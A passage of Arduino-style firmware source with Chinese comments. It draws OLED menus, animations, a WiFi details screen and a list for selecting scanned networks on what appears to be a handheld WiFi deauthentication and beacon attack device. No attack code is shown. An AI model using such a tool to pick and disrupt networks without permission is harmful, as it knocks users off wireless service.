      display.setCursor(3, i * ITEM_HEIGHT + BASELINE_ASCII_OFFSET + Y_OFFSET);
      display.setTextColor(SSD1306_WHITE);
      display.print("[*]");
    }
    int textX = TEXT_LEFT + (isSelected ? STAR_GAP : 0);
    String clipped = utf8TruncateToWidth(ssid, SSID_RIGHT_LIMIT_X - textX);
    if (containsChinese(ssid)) {
      u8g2_for_adafruit_gfx.setFontMode(1);
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
      int textY = i * ITEM_HEIGHT + BASELINE_CHINESE_OFFSET + Y_OFFSET;
      u8g2_for_adafruit_gfx.setCursor(textX, textY);
      u8g2_for_adafruit_gfx.print(clipped);
    } else {
      display.setCursor(textX, i * ITEM_HEIGHT + BASELINE_ASCII_OFFSET + Y_OFFSET);
      display.setTextColor(SSD1306_WHITE);
      display.print(clipped);
    }
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(110, i * ITEM_HEIGHT + BASELINE_ASCII_OFFSET + Y_OFFSET);
    display.print(scan_results[wifiIndex].channel >= 36 ? "5G" : "24");
  }
}

// 通用动画（首页等使用）：预留右侧滚动条区，圆角与静止样式一致
void animateMove(int yFrom, int yTo, int rectHeight, void (*drawBase)()) {
  animateSelectionGeneric(yFrom, yTo, rectHeight, 4, /*useFullWidth=*/false, /*doubleOutline=*/false, drawBase);
}

// 菜单动画（攻击/信标等）：全宽描边，圆角与静止样式一致
void animateMoveFullWidth(int yFrom, int yTo, int rectHeight, void (*drawBase)(), int cornerRadius) {
  animateSelectionGeneric(yFrom, yTo, rectHeight, cornerRadius, /*useFullWidth=*/true, /*doubleOutline=*/false, drawBase);
}

// 特殊动画：带起始索引（解除认证菜单）
void animateMoveDeauth(int yFrom, int yTo, int rectHeight, int startIndex) {
  g_deauthBaseStartIndex = startIndex;
  animateSelectionGeneric(yFrom, yTo, rectHeight, 2, /*useFullWidth=*/true, /*doubleOutline=*/false, drawDeauthMenuBaseShim);
}

// 特殊动画：SSID页面（带起始索引）
void animateMoveSsid(int yFrom, int yTo, int rectHeight, int startIndex) {
  g_ssidBaseStartIndex = startIndex;
  animateSelectionGeneric(yFrom, yTo, rectHeight, 2, /*useFullWidth=*/true, /*doubleOutline=*/true, drawSsidPageBaseShim);
}

// 特殊动画：首页菜单（带起始索引）- 与攻击页完全一致
void animateMoveHome(int yFrom, int yTo, int rectHeight, int startIndex) {
  g_homeBaseStartIndex = startIndex;
  animateSelectionGeneric(yFrom, yTo, rectHeight, 7, /*useFullWidth=*/false, /*doubleOutline=*/false, drawHomeMenuBasePagedShim);
}

// ===== Root menu (WIFI / BLE) =====
void drawRootMenu() {
  // 新的主菜单样式：圆角矩形，居中显示，带间距
  display.clearDisplay();
  display.setTextSize(1);
  
  // 计算总高度和起始Y位置
  int totalHeight = (g_rootMenuCount * 20) + ((g_rootMenuCount - 1) * 8);
  int startY = (display.height() - totalHeight) / 2;
  
  for (int i = 0; i < g_rootMenuCount; i++) {
    int menuIndex = i;
    if (menuIndex >= g_rootMenuCount) break;
    
    // 计算选项位置
    int rectY = startY + i * (20 + 8);
    int rectX = 14;
    
    bool isSel = (i == rootState);
    
    // 绘制选项背景
    if (isSel) {
      // 选中状态：填充圆角矩形
      display.fillRoundRect(rectX, rectY, 100, 20, 3, SSD1306_WHITE);
    } else {
      // 未选中状态：绘制圆角矩形边框
      display.drawRoundRect(rectX, rectY, 100, 20, 3, SSD1306_WHITE);
    }
    
    // 计算文字位置（居中）
    const char* label = g_rootMenuItems[menuIndex].label;
    int textWidth = u8g2_for_adafruit_gfx.getUTF8Width(label);
    int textX = rectX + (100 - textWidth) / 2;
    int textY = rectY + (20 + 8) / 2; // 垂直居中
    
    // 设置文字颜色和绘制
    u8g2_for_adafruit_gfx.setFontMode(1);
    if (isSel) {
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK); // 选中时黑色文字
    } else {
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE); // 未选中时白色文字
    }
    u8g2_for_adafruit_gfx.setCursor(textX, textY);
    u8g2_for_adafruit_gfx.print(label);
  }
  
  display.display();
}

inline void setRootSelection(int startIndex, int state) {
  rootStartIndex = startIndex;
  rootState = state;
}

inline void rootMoveUp(unsigned long currentTime) {
  if (currentTime - lastDownTime <= DEBOUNCE_DELAY) return;
  if (rootState > 0) setRootSelection(rootStartIndex, rootState - 1);
  lastDownTime = currentTime;
}
inline void rootMoveDown(unsigned long currentTime) {
  if (currentTime - lastUpTime <= DEBOUNCE_DELAY) return;
  if (rootState < g_rootMenuCount - 1) setRootSelection(rootStartIndex, rootState + 1);
  lastUpTime = currentTime;
}
inline void handleRootOk() {
  if (digitalRead(BTN_OK) != LOW) return; delay(200);
  int idx = rootStartIndex + rootState;
  if (idx >= 0 && idx < g_rootMenuCount && g_rootMenuItems[idx].action) g_rootMenuItems[idx].action();
}

// ===== BLE submenu =====
// BLE 子菜单改为复用通用菜单绘制与动画
static bool g_bleSkipNextSelectAnim = false;
void drawBleMenu() {
  static int prevBleState = -1;
  // 选择动画准备
  g_genericMenuItems = g_bleMenuItems;
  g_genericMenuCount = g_bleMenuCount;
  g_genericBaseStartIndex = bleStartIndex;
  if (prevBleState == -1) prevBleState = bleState;
  if (!g_bleSkipNextSelectAnim && prevBleState != bleState) {
    int yFrom = HOME_Y_OFFSET + prevBleState * HOME_ITEM_HEIGHT;
    int yTo   = HOME_Y_OFFSET + bleState   * HOME_ITEM_HEIGHT;
    animateMoveGenericMenu(yFrom, yTo, HOME_RECT_HEIGHT, bleStartIndex);
    prevBleState = bleState;
  } else if (g_bleSkipNextSelectAnim) {
    prevBleState = bleState;
    g_bleSkipNextSelectAnim = false;
  }
  // 绘制当前页
  display.clearDisplay();
  display.setTextSize(1);
  int visible = (HOME_PAGE_SIZE < (g_bleMenuCount - bleStartIndex)) ? HOME_PAGE_SIZE : (g_bleMenuCount - bleStartIndex);
  for (int i = 0; i < visible; i++) {
    int idx = bleStartIndex + i; if (idx >= g_bleMenuCount) break;
    int rectY = HOME_Y_OFFSET + i * HOME_ITEM_HEIGHT;
    int textY = rectY + 13;
    bool isSel = (i == bleState);
    String label = g_bleMenuItems[idx].label;
    int maxTextWidth = display.width() - UI_RIGHT_GUTTER - 15;
    int labelWidth = u8g2_for_adafruit_gfx.getUTF8Width(label.c_str());
    if (labelWidth > maxTextWidth) {
      while (label.length() > 0 && u8g2_for_adafruit_gfx.getUTF8Width(label.c_str()) > maxTextWidth - 20) {
        label.remove(label.length() - 1);
        while (label.length() > 0 && ((uint8_t)label[label.length()-1] & 0xC0) == 0x80) { label.remove(label.length() - 1); }
      }
      label += "..";
    }
    if (isSel) {
      display.fillRoundRect(0, rectY, display.width() - UI_RIGHT_GUTTER, HOME_RECT_HEIGHT, 4, SSD1306_WHITE);
      u8g2_for_adafruit_gfx.setFontMode(1);
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK);
      u8g2_for_adafruit_gfx.setCursor(5, textY + 1);
      u8g2_for_adafruit_gfx.print(label);
    } else {
      u8g2_for_adafruit_gfx.setFontMode(1);
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
      u8g2_for_adafruit_gfx.setCursor(5, textY + 1);
      u8g2_for_adafruit_gfx.print(label);
    }
    drawRightChevron(rectY, HOME_RECT_HEIGHT, isSel);
  }
  // BLE 菜单即便无需翻页也绘制占位滚动条
  drawScrollbarGenericAlways(g_bleMenuCount, HOME_PAGE_SIZE, bleStartIndex);
  display.display();
}
inline void setBleSelection(int startIndex, int state) { bleStartIndex = startIndex; bleState = state; }
// BLE 上/下移动复用通用逻辑（带翻页动画）
inline void bleMoveUp(unsigned long currentTime) {
  if (currentTime - lastDownTime <= DEBOUNCE_DELAY) return;
  if (bleState > 0) {
    setBleSelection(bleStartIndex, bleState - 1);
  } else if (bleStartIndex > 0) {
    int prevStart = bleStartIndex;
    setBleSelection(bleStartIndex - 1, 0);
    animateMenuPageFlip_Generic(g_bleMenuItems, g_bleMenuCount, prevStart, bleStartIndex);
    g_bleSkipNextSelectAnim = true;
  }
  lastDownTime = currentTime;
}
inline void bleMoveDown(unsigned long currentTime) {
  if (currentTime - lastUpTime <= DEBOUNCE_DELAY) return;
  int currentPageItems = (HOME_PAGE_SIZE < (g_bleMenuCount - bleStartIndex)) ? HOME_PAGE_SIZE : (g_bleMenuCount - bleStartIndex);
  if (bleState < currentPageItems - 1) {
    setBleSelection(bleStartIndex, bleState + 1);
  } else if (bleStartIndex + bleState + 1 < g_bleMenuCount) {
    int prevStart = bleStartIndex;
    int nextStartIndex = bleStartIndex + 1;
    int nextPageItems = (HOME_PAGE_SIZE < (g_bleMenuCount - nextStartIndex)) ? HOME_PAGE_SIZE : (g_bleMenuCount - nextStartIndex);
    int nextState = (nextPageItems > 0) ? (nextPageItems - 1) : 0;
    setBleSelection(nextStartIndex, nextState);
    animateMenuPageFlip_Generic(g_bleMenuItems, g_bleMenuCount, prevStart, nextStartIndex);
    g_bleSkipNextSelectAnim = true;
  }
  lastUpTime = currentTime;
}
inline void handleBleOk() {
  if (digitalRead(BTN_OK) != LOW) return; delay(200);
  int idx = bleStartIndex + bleState;
  if (idx >= 0 && idx < g_bleMenuCount && g_bleMenuItems[idx].action) g_bleMenuItems[idx].action();
}

// ===== Existing WiFi submenu (Home menu) =====
void drawHomeMenu() {
  static int prevState = -1;

  int startIndex = homeStartIndex;
  g_homeBaseStartIndex = startIndex;

  // 将 WiFi 菜单切换到通用菜单上下文
  g_genericMenuItems = g_homeMenuItems;
  g_genericMenuCount = g_homeMenuCount;
  g_genericBaseStartIndex = startIndex;

  if (prevState == -1) prevState = homeState;

  // 只在选择项改变时播放选择动画，翻页动画由按键处理
  if (!g_skipNextSelectAnim && prevState != homeState) {
    int yFrom = HOME_Y_OFFSET + prevState * HOME_ITEM_HEIGHT;
    int yTo = HOME_Y_OFFSET + homeState * HOME_ITEM_HEIGHT;
    // 使用通用菜单选择动画（与 BLE 复用一致）
    animateMoveGenericMenu(yFrom, yTo, HOME_RECT_HEIGHT, startIndex);
    prevState = homeState;
  } else if (g_skipNextSelectAnim) {
    // 跳过一次选择动画后立即恢复
    prevState = homeState;
    g_skipNextSelectAnim = false;
  }

  display.clearDisplay();
  display.setTextSize(1);
  // 计算当前页实际显示的项目数量
  int currentPageItems = (HOME_PAGE_SIZE < (HOME_MAX_ITEMS - startIndex)) ? HOME_PAGE_SIZE : (HOME_MAX_ITEMS - startIndex);
  for (int i = 0; i < currentPageItems; i++) {
    int menuIndex = startIndex + i;
    if (menuIndex >= HOME_MAX_ITEMS) break;
    int rectY = HOME_Y_OFFSET + i * HOME_ITEM_HEIGHT;
    int textY = rectY + 13; // 主菜单文字整体下移2px
    bool isSel = (i == homeState);
    
    // 获取并裁剪标签，防止文字超出选择框范围
    String label = g_homeMenuItems[menuIndex].label;
    int maxTextWidth = display.width() - UI_RIGHT_GUTTER - 15; // 留出箭头和边距
    int labelWidth = u8g2_for_adafruit_gfx.getUTF8Width(label.c_str());
    
    if (labelWidth > maxTextWidth) {
      // UTF-8安全裁剪
      while (label.length() > 0 && 
             u8g2_for_adafruit_gfx.getUTF8Width(label.c_str()) > maxTextWidth - 20) {
        // 移除最后一个字符（UTF-8安全）
        label.remove(label.length() - 1);
        // 跳过UTF-8续字节
        while (label.length() > 0 && ((uint8_t)label[label.length()-1] & 0xC0) == 0x80) {
          label.remove(label.length() - 1);
        }
      }
      label += "..";
    }
    
    if (isSel) {
      // 使用与攻击页完全一致的高亮效果（减去右侧滚动条区域避免覆盖）
      display.fillRoundRect(0, rectY, display.width() - UI_RIGHT_GUTTER, HOME_RECT_HEIGHT, 4, SSD1306_WHITE);
      u8g2_for_adafruit_gfx.setFontMode(1);
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK);
      u8g2_for_adafruit_gfx.setCursor(5, textY + 1);
      u8g2_for_adafruit_gfx.print(label);
    } else {
      u8g2_for_adafruit_gfx.setFontMode(1);
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
      u8g2_for_adafruit_gfx.setCursor(5, textY + 1);
      u8g2_for_adafruit_gfx.print(label);
    }
    // 使用与攻击页完全一致的右箭头指示器
    drawRightChevron(rectY, HOME_RECT_HEIGHT, isSel);
  }
  // 绘制滚动条
  drawHomeScrollbar(startIndex);
  display.display();
}

// Root enter actions
void rootActionEnterWifi() { g_menuMode = MENU_WIFI; setHomeSelection(0, 0); }
void rootActionEnterBle()  { g_menuMode = MENU_BLE;  setBleSelection(0, 0); }

// 首页菜单：统一同步选择状态到全局，并更新基础绘制起始索引
inline void setHomeSelection(int startIndex, int state) {
  homeStartIndex = startIndex;
  homeState = state;
  menustate = homeStartIndex + homeState;
  g_homeBaseStartIndex = homeStartIndex;
}

// 首页菜单：处理"上"按键逻辑，带去抖与翻页动画
inline void homeMoveUp(unsigned long currentTime) {
  if (currentTime - lastDownTime <= DEBOUNCE_DELAY) return;
  if (homeState > 0) {
    setHomeSelection(homeStartIndex, homeState - 1);
  } else if (homeStartIndex > 0) {
    // 向上滚动一项
    int prevStart = homeStartIndex;
    setHomeSelection(homeStartIndex - 1, 0);
    // 使用通用菜单翻页动画
    animateMenuPageFlip_Generic(g_homeMenuItems, g_homeMenuCount, prevStart, homeStartIndex);
    g_skipNextSelectAnim = true;
  }
  lastDownTime = currentTime;
}

// 首页菜单：处理"下"按键逻辑，带去抖与翻页动画
inline void homeMoveDown(unsigned long currentTime) {
  if (currentTime - lastUpTime <= DEBOUNCE_DELAY) return;
  // 计算当前页实际显示的项目数量
  int currentPageItems = (HOME_PAGE_SIZE < (HOME_MAX_ITEMS - homeStartIndex)) ? HOME_PAGE_SIZE : (HOME_MAX_ITEMS - homeStartIndex);
  if (homeState < currentPageItems - 1) {
    setHomeSelection(homeStartIndex, homeState + 1);
  } else if (homeStartIndex + homeState + 1 < HOME_MAX_ITEMS) {
    // 向下滚动一项（确保不超过总项目数）
    int prevStart = homeStartIndex;
    int nextStartIndex = homeStartIndex + 1;
    // 计算下一页应该显示的项目数量
    int nextPageItems = (HOME_PAGE_SIZE < (HOME_MAX_ITEMS - nextStartIndex)) ? HOME_PAGE_SIZE : (HOME_MAX_ITEMS - nextStartIndex);
    // 设置homeState为最后一行的索引（确保在新页范围内）
    int nextHomeState = (nextPageItems > 0) ? (nextPageItems - 1) : 0;
    setHomeSelection(nextStartIndex, nextHomeState);
    // 使用通用菜单翻页动画
    animateMenuPageFlip_Generic(g_homeMenuItems, g_homeMenuCount, prevStart, nextStartIndex);
    g_skipNextSelectAnim = true;
  }
  // 当到达最后一页的最后一个项目时，不执行任何操作（阻止继续向下移动）
  lastUpTime = currentTime;
}

// 首页菜单：处理"确认/OK"按键逻辑
inline void handleHomeOk() {
  if (digitalRead(BTN_OK) != LOW) return;
  delay(400);
  // 使用统一的动作函数系统
  if (menustate >= 0 && menustate < HOME_MAX_ITEMS) {
    if (g_homeMenuItems[menustate].action != nullptr) {
      g_homeMenuItems[menustate].action();
    }
  }
}

void showWiFiDetails(const WiFiScanResult& wifi) {
    bool exitDetails = false;
    int scrollPosition = 0;
    unsigned long lastScrollTime = 0;
    const unsigned long SCROLL_DELAY = 300;
    int detailsScroll = 0;  // 初始化为0，不直接定位到返回按钮
    const int LINE_HEIGHT = 12; // 增加行高，避免文字重叠
    
    // 添加去抖变量，与首页保持一致
    unsigned long lastUpTime = 0;
    unsigned long lastDownTime = 0;
    unsigned long lastBackTime = 0;
    unsigned long lastOkTime = 0;
    
    while (!exitDetails) {
        unsigned long currentTime = millis();
        
        if (digitalRead(BTN_BACK) == LOW) {
            if (currentTime - lastBackTime <= DEBOUNCE_DELAY) continue;
            exitDetails = true;
            continue;
        }
        
        if (digitalRead(BTN_UP) == LOW) {
            if (currentTime - lastUpTime <= DEBOUNCE_DELAY) continue;
            if (detailsScroll > 0) detailsScroll--;
            scrollPosition = 0; // 重置滚动位置
            lastUpTime = currentTime;
        }
        
        if (digitalRead(BTN_DOWN) == LOW) {
            if (currentTime - lastDownTime <= DEBOUNCE_DELAY) continue;
            if (detailsScroll < 1) detailsScroll++; // 最多滚动1次，因为总共5行，一屏显示4行
            scrollPosition = 0; // 重置滚动位置
            lastDownTime = currentTime;
        }

        if (digitalRead(BTN_OK) == LOW) {
            if (currentTime - lastOkTime <= DEBOUNCE_DELAY) continue;
            if (detailsScroll == 1) {
                exitDetails = true;
                continue;
            }
            lastOkTime = currentTime;
        }

        display.clearDisplay();
        display.setTextSize(1);
        
        struct DetailLine {
            String label;
            String value;
            bool isChinese;
        };
        
        DetailLine details[] = {
            {"SSID:", wifi.ssid.length() > 0 ? sanitizeForDisplay(wifi.ssid) : "<隐藏>", containsChinese(wifi.ssid)},
            {"信号:", String(wifi.rssi) + " dBm", true}, 
            {"信道:", String(wifi.channel) + (wifi.channel >= 36 ? " (5G)" : " (2.4G)"), true},
            {"MAC:", wifi.bssid_str, false},
            {"《 返回 》", "", true}
        };

        // 显示详细信息
        for (int i = 0; i < 4 && (i + detailsScroll) < 5; i++) {
            int currentLine = i + detailsScroll;
            int yPos = 5 + (i * LINE_HEIGHT); // 使用更大的行高
            
            if (currentLine == 4) { // 返回选项
                if (detailsScroll == 1) {
                    display.fillRoundRect(0, yPos-1, display.width(), LINE_HEIGHT, 3, WHITE);
                    u8g2_for_adafruit_gfx.setFontMode(1);
                    u8g2_for_adafruit_gfx.setForegroundColor(BLACK);
                    u8g2_for_adafruit_gfx.setCursor(0, yPos+8);
                    u8g2_for_adafruit_gfx.print("《 返回 》");
                    u8g2_for_adafruit_gfx.setForegroundColor(WHITE);
                } else {
                    u8g2_for_adafruit_gfx.setFontMode(1);
                    u8g2_for_adafruit_gfx.setForegroundColor(WHITE);
                    u8g2_for_adafruit_gfx.setCursor(0, yPos+8);
                    u8g2_for_adafruit_gfx.print("《 返回 》");
                }
                continue;
            }

            // 显示标签和值
            if (details[currentLine].isChinese) {
                u8g2_for_adafruit_gfx.setFontMode(1);
                u8g2_for_adafruit_gfx.setForegroundColor(WHITE);
                u8g2_for_adafruit_gfx.setCursor(0, yPos+8);
                u8g2_for_adafruit_gfx.print(details[currentLine].label);
                
                // 统一从冒号后开始显示值，增加间距
                const int VALUE_X = 40; // 减小间距，避免重叠
                
                // 处理值的滚动显示
                String value = details[currentLine].value;
                bool needScroll = false;
                
                // 判断是否需要滚动
                if (containsChinese(value) && value.length() > 15) { // 中文字符串超过15个字符需要滚动
                    needScroll = true;
                } else if (!containsChinese(value) && value.length() > 20) { // 英文字符串超过20个字符需要滚动
                    needScroll = true;
                }
                
                if (needScroll) {
                    // 更新滚动位置
                    if (currentTime - lastScrollTime >= SCROLL_DELAY) {
                        scrollPosition++;
                        if ((size_t)scrollPosition >= value.length()) {
                            scrollPosition = 0;
                        }
                        lastScrollTime = currentTime;
                    }
                    
                    // 创建滚动文本
                    String scrolledText = value.substring(scrollPosition) + " " + value.substring(0, scrollPosition);
                    value = scrolledText.substring(0, containsChinese(value) ? 15 : 20);
                }
                
                u8g2_for_adafruit_gfx.setCursor(VALUE_X, yPos+8);
                u8g2_for_adafruit_gfx.print(value);
            } else {
                // 非中文标签
                u8g2_for_adafruit_gfx.setFontMode(1);
                u8g2_for_adafruit_gfx.setForegroundColor(WHITE);
                u8g2_for_adafruit_gfx.setCursor(0, yPos+8);
                u8g2_for_adafruit_gfx.print(details[currentLine].label);
                
                // 统一从冒号后开始显示值
                const int VALUE_X = 26;
                if (details[currentLine].value.length() > 0) {
                    String value = details[currentLine].value;
                    bool needScroll = false;
                    
                    // MAC地址可能很长，判断是否需要滚动
                    if (value.length() > 20) {
                        needScroll = true;
                    }
                    
                    if (needScroll) {
                        // 更新滚动位置
                        if (currentTime - lastScrollTime >= SCROLL_DELAY) {
                            scrollPosition++;
                            if ((size_t)scrollPosition >= value.length()) {
                                scrollPosition = 0;
                            }
                            lastScrollTime = currentTime;
                        }
                        
                        // 创建滚动文本
                        String scrolledText = value.substring(scrollPosition) + " " + value.substring(0, scrollPosition);
                        value = scrolledText.substring(0, 20);
                    }
                    
                    if (containsChinese(value)) {
                        u8g2_for_adafruit_gfx.setCursor(VALUE_X, yPos+8);
                        u8g2_for_adafruit_gfx.print(value);
                    } else {
                        display.setCursor(VALUE_X, yPos);
                        display.print(value);
                    }
                }
            }
        }
        
        // 显示滚动指示器
        if (detailsScroll > 0) {
            display.fillTriangle(120, 12, 123, 9, 126, 12, WHITE);
        }
        if (detailsScroll < 1) { // 修改为1
            display.fillTriangle(120, 60, 123, 63, 126, 60, WHITE);
        }
        
        display.display();
        delay(10);
    }
}
void drawssid() {
  const int MAX_DISPLAY_ITEMS = 4; // 每页显示4项
  const int ITEM_HEIGHT = 14; // 增大选项间距
  const int Y_OFFSET = 2; // 添加Y轴偏移量
  const int TEXT_LEFT = 6; // 左内边距
  const int BASELINE_ASCII_OFFSET = 4; // 英文/数字垂直偏移
  const int BASELINE_CHINESE_OFFSET = 10; // 中文垂直偏移
  const int SSID_RIGHT_LIMIT_X = 110; // SSID 文本可用区域右边界（避免与 24/5G 重叠）
  const int STAR_GAP = 20; // 选中标记"[*]"预留的水平间距
  const int ARROW_GAP = 8; // 仅高亮">"时的较小预留间距
  int startIndex = 0;
  scrollindex = 0;
  bool allSelected = (SelectedVector.size() == scan_results.size() && !scan_results.empty());
  
  // 移除未使用的长按相关变量，避免编译告警
  
  unsigned long lastScrollTime = 0;
  const unsigned long SCROLL_DELAY = 300;
  int scrollPosition = 0;
  String currentScrollText = "";
  
  // 添加去抖变量，与首页保持一致
  unsigned long lastUpTime = 0;
  unsigned long lastDownTime = 0;
  
  while(true) {
    unsigned long currentTime = millis();
    // 根据当前选择数量动态计算是否"全选"
    allSelected = (SelectedVector.size() == scan_results.size() && !scan_results.empty());
    
    if(digitalRead(BTN_BACK)==LOW) {
      // 等待按键释放，避免主循环立即检测到返回键
      while(digitalRead(BTN_BACK) == LOW) { delay(10); }
      return;
    }
    
    if(digitalRead(BTN_OK) == LOW) {
      delay(400);
      if(scrollindex == 0) {
        // 切换全选/取消全选
        if (!allSelected) {
          SelectedVector.clear();
          SelectedVector.reserve(scan_results.size());
          for (size_t i = 0; i < scan_results.size(); i++) {
            SelectedVector.push_back((int)i);
          }
          selectedFlags.assign(scan_results.size(), 1);
          allSelected = true;
        } else {
          SelectedVector.clear();
          selectedFlags.assign(scan_results.size(), 0);
          allSelected = false;
        }
      } else {
        // 切换单项选中状态（去除返回项后的新索引）
        toggleSelection(scrollindex - 1);
      }
      unsigned long pressStartTime = millis();
      while (digitalRead(BTN_OK) == LOW) {
        if (millis() - pressStartTime >= 800) {
          if (scrollindex >= 1) {
            showWiFiDetails(scan_results[scrollindex - 1]);
          }
          while (digitalRead(BTN_OK) == LOW) delay(10);
          break;
        }
      }
      lastDownTime = currentTime;
    }
    
    if(digitalRead(BTN_DOWN) == LOW) {
      if (currentTime - lastDownTime <= DEBOUNCE_DELAY) continue;
      scrollPosition = 0;
      // 防止越界：最大只允许移动到最后一个SSID（索引为 scan_results.size()）
      if(scrollindex < (int)scan_results.size()) {
        int prev = scrollindex;
        scrollindex++;
        if(scrollindex - startIndex >= MAX_DISPLAY_ITEMS) {
          startIndex++;
          // 页向下（下一页）：从倒数第二项位置开始移动（第3行，索引 MAX_DISPLAY_ITEMS-2）
          int yFrom = (MAX_DISPLAY_ITEMS-2) * ITEM_HEIGHT + Y_OFFSET - 1;
          int yTo = (MAX_DISPLAY_ITEMS-1) * ITEM_HEIGHT + Y_OFFSET - 1;
          animateMoveSsid(yFrom, yTo, ITEM_HEIGHT + 2, startIndex);
        } else {
          // 在同一页内，执行动画
          int yFrom = (prev - startIndex) * ITEM_HEIGHT + Y_OFFSET - 1; // 与描边一致
          int yTo = (scrollindex - startIndex) * ITEM_HEIGHT + Y_OFFSET - 1;
          animateMoveSsid(yFrom, yTo, ITEM_HEIGHT + 2, startIndex);
        }
      }
      lastUpTime = currentTime;
    }
    
    if(digitalRead(BTN_UP) == LOW) {
      if (currentTime - lastUpTime <= DEBOUNCE_DELAY) continue;
      scrollPosition = 0;
      if(scrollindex > 0) {
        int prev = scrollindex;
        scrollindex--;
        if(scrollindex < startIndex && startIndex > 0) {
          startIndex--;
          // 页向上（上一页）：从第二项移动到第一项
          int yFrom = 1 * ITEM_HEIGHT + Y_OFFSET - 1;   // 第二行
          int yTo = 0 * ITEM_HEIGHT + Y_OFFSET - 1;     // 第一行
          animateMoveSsid(yFrom, yTo, ITEM_HEIGHT + 2, startIndex);
          // 让高亮停在第一行
          scrollindex = startIndex;
        } else {
          int yFrom = (prev - startIndex) * ITEM_HEIGHT + Y_OFFSET - 1;
          int yTo = (scrollindex - startIndex) * ITEM_HEIGHT + Y_OFFSET - 1;
          animateMoveSsid(yFrom, yTo, ITEM_HEIGHT + 2, startIndex);
        }
      }
      lastUpTime = currentTime;
    }
    
    display.clearDisplay();
    display.setTextSize(1);
    
    for(int i = 0; i < MAX_DISPLAY_ITEMS && i <= (int)scan_results.size(); i++) {
      int displayIndex = startIndex + i;
      if(displayIndex > (int)scan_results.size()) break;
      
      bool isHighlighted = (displayIndex == scrollindex);
      
      // 顶部仅保留全选/取消全选选项（水平居中）
      if(displayIndex == 0) {
        int yPos = i * ITEM_HEIGHT + Y_OFFSET;
        if(isHighlighted) {
          display.drawRoundRect(0, yPos-2, display.width(), ITEM_HEIGHT + 2, 2, SSD1306_WHITE);
          display.drawRoundRect(1, yPos-1, display.width()-2, ITEM_HEIGHT, 2, SSD1306_WHITE); // 加粗描边
          u8g2_for_adafruit_gfx.setFontMode(1);
          u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
          const char* label = allSelected ? "> 取消全选 <" : "> 全选 <";
          int w = u8g2_for_adafruit_gfx.getUTF8Width(label);
          int x = (display.width() - w) / 2;
          u8g2_for_adafruit_gfx.setCursor(x, yPos + BASELINE_CHINESE_OFFSET);
          u8g2_for_adafruit_gfx.print(label);
        } else {
          u8g2_for_adafruit_gfx.setFontMode(1);
          u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
          const char* label = allSelected ? "> 取消全选 <" : "> 全选 <";
          int w = u8g2_for_adafruit_gfx.getUTF8Width(label);
          int x = (display.width() - w) / 2;
          u8g2_for_adafruit_gfx.setCursor(x, yPos + BASELINE_CHINESE_OFFSET);
          u8g2_for_adafruit_gfx.print(label);
        }
        continue;
      }
      
      // 处理WiFi条目
      int wifiIndex = displayIndex - 1;
      String ssid = sanitizeForDisplay(scan_results[wifiIndex].ssid);
      
      if(ssid.length() == 0) {
        char mac[18];
        snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
          scan_results[wifiIndex].bssid[0],
          scan_results[wifiIndex].bssid[1],
          scan_results[wifiIndex].bssid[2],
          scan_results[wifiIndex].bssid[3],
          scan_results[wifiIndex].bssid[4],
          scan_results[wifiIndex].bssid[5]);
        ssid = String(mac);
      }

      // 处理滚动显示 - 修改滚动逻辑
      bool needScroll = false;
      if(isHighlighted) {
        if(containsChinese(ssid) && ssid.length() > 26) { // 中文>26后滚动
          needScroll = true;
        } else if(!containsChinese(ssid) && ssid.length() > 18) { // 英文>18后滚动
          needScroll = true;
        }
        
        if(needScroll) {
          if(currentTime - lastScrollTime >= SCROLL_DELAY) {
            scrollPosition++;
            if(scrollPosition >= (int)ssid.length()) {
              scrollPosition = 0;
            }
            lastScrollTime = currentTime;
          }
          String scrolledText = ssid.substring(scrollPosition) + ssid.substring(0, scrollPosition);
          ssid = scrolledText.substring(0, containsChinese(ssid) ? 26 : 18);
        }
      }                                                            
      
      // 处理文本显示
      {
        // 统一高亮描边：中英文都画边框
        if(isHighlighted) {
          int rectY = i * ITEM_HEIGHT - 1 + Y_OFFSET;
          display.drawRoundRect(0, rectY, display.width(), ITEM_HEIGHT + 2, 2, SSD1306_WHITE);
          display.drawRoundRect(1, rectY+1, display.width()-2, ITEM_HEIGHT-0, 2, SSD1306_WHITE); // 加粗描边
        }

        // 左侧指示：选中显示"[*]", 未选中但高亮显示">", 其余不显示
        bool isSelected = isIndexSelected(wifiIndex);
        bool showIndicator = isSelected || (isHighlighted && !isSelected);
        if (showIndicator) {
          display.setCursor(3, i * ITEM_HEIGHT + BASELINE_ASCII_OFFSET + Y_OFFSET);
          display.setTextColor(SSD1306_WHITE);
          if (isSelected) {
            display.print("[*]");
          } else {
            display.print('>');
          }
        }

        {
          int textX = TEXT_LEFT + (isSelected ? STAR_GAP : (showIndicator ? ARROW_GAP : 0));
          int maxW = SSID_RIGHT_LIMIT_X - textX;
          String renderText = ssid;
          if (isHighlighted) {
            int textW = u8g2_for_adafruit_gfx.getUTF8Width(renderText.c_str());
            if (textW > maxW) {
              if (currentTime - lastScrollTime >= SCROLL_DELAY) {
                scrollPosition = advanceUtf8Index(renderText, scrollPosition);
                if (scrollPosition >= (int)renderText.length()) scrollPosition = 0;
                lastScrollTime = currentTime;
              }
              String rotated = renderText.substring(scrollPosition) + renderText.substring(0, scrollPosition);
              renderText = utf8ClipToWidthNoEllipsis(rotated, maxW);
            } else {
              renderText = utf8ClipToWidthNoEllipsis(renderText, maxW);
            }
          } else {
            renderText = utf8TruncateToWidth(renderText, maxW);
          }

          if(containsChinese(ssid)) {
            u8g2_for_adafruit_gfx.setFontMode(1);
            u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
            int textY = i * ITEM_HEIGHT + BASELINE_CHINESE_OFFSET + Y_OFFSET + (isHighlighted ? 1 : 0);
            u8g2_for_adafruit_gfx.setCursor(textX, textY);
            u8g2_for_adafruit_gfx.print(renderText);
          } else {
